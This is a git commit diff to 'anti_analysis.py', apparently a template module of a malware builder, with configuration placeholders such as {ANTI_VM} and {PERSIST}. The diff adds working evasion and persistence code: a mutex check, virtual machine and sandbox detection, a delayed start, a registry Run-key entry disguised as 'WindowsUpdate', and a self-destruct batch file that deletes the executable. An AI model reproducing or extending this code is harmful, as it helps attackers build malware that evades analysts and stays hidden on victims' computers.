030ec69029d23d0040c81ed32c99fecc050e130c
exsarorrayzer <theleapy@gmail.com>
2026-01-01 03:30:07 +0400

    Update anti_analysis.py

--- raw/anti_analysis.py
+++ raw/anti_analysis.py
@@ -15,40 +15,43 @@ def elevate_admin():
     return True
 
 def check_mutex():
-    try:
-        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
-        if ctypes.windll.kernel32.GetLastError() == 183:
-            sys.exit()
-        return mutex
-    except:
-        pass
+    if {MUTEX}:
+        try:
+            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
+            if ctypes.windll.kernel32.GetLastError() == 183:
+                sys.exit()
+            return mutex
+        except:
+            pass
     return None
 
 def check_vm():
-    try:
-        vm_indicators = ["VMware", "VirtualBox", "VBox", "VMnet", "VirtIO", "QEMU", "Xen", "Hyper-V"]
-        
-        computer_name = os.environ.get("COMPUTERNAME", "").upper()
-        for indicator in vm_indicators:
-            if indicator.upper() in computer_name:
-                return True
-        
-        proc_info = os.environ.get("PROCESSOR_IDENTIFIER", "").upper()
-        for indicator in vm_indicators:
-            if indicator.upper() in proc_info:
-                return True
-        
+    if {ANTI_VM}:
         try:
-            output = subprocess.check_output("wmic computersystem get model", shell=True, stderr=subprocess.DEVNULL).decode().upper()
+            vm_indicators = ["VMware", "VirtualBox", "VBox", "VMnet", "VirtIO", "QEMU", "Xen", "Hyper-V"]
+            
+            computer_name = os.environ.get("COMPUTERNAME", "").upper()
             for indicator in vm_indicators:
-                if indicator.upper() in output:
+                if indicator.upper() in computer_name:
                     return True
+            
+            proc_info = os.environ.get("PROCESSOR_IDENTIFIER", "").upper()
+            for indicator in vm_indicators:
+                if indicator.upper() in proc_info:
+                    return True
+            
+            try:
+                output = subprocess.check_output("wmic computersystem get model", shell=True, stderr=subprocess.DEVNULL).decode().upper()
+                for indicator in vm_indicators:
+                    if indicator.upper() in output:
+                        return True
+            except:
+                pass
+            
+            return False
         except:
-            pass
-        
-        return False
-    except:
-        return False
+            return False
+    return False
 
 def check_sandbox():
     try:
@@ -62,41 +65,32 @@ def check_sandbox():
         if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
             return True
         
-        sandbox_processes = ["vmsrvc", "vmusrvc", "vboxtray", "vboxservice", "vmwaretray", "vmwareuser"]
-        
-        for proc in psutil.process_iter(['name']):
-            try:
-                proc_name = proc.info['name'].lower() if proc.info['name'] else ''
-                for sandbox_proc in sandbox_processes:
-                    if sandbox_proc in proc_name:
-                        return True
-            except:
-                continue
-        
         return False
     except:
         return False
 
-def startup_delay(seconds):
-    time.sleep(seconds)
+def startup_delay():
+    if {STARTUP_DELAY}:
+        time.sleep({DELAY_SECONDS})
 
 def add_persistence():
-    try:
-        exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
-        
-        key = winreg.HKEY_CURRENT_USER
-        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
-            winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
-    except:
-        pass
+    if {PERSIST}:
+        try:
+            exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
+            
+            key = winreg.HKEY_CURRENT_USER
+            key_path = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
+            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
+                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
+        except:
+            pass
 
 def self_destruct():
     try:
         bat_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
         exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
         
-        escaped_path = exe_path.replace('\\', '\\\\')
+        escaped_path = exe_path.replace('\\\\', '\\\\\\\\')
         
         bat_lines = [
             '@echo off',
@@ -107,7 +101,7 @@ def self_destruct():
             'exit'
         ]
         
-        bat_content = '\\n'.join(bat_lines)
+        bat_content = '\\\\n'.join(bat_lines)
         
         with open(bat_path, 'w', encoding='utf-8') as f:
             f.write(bat_content)
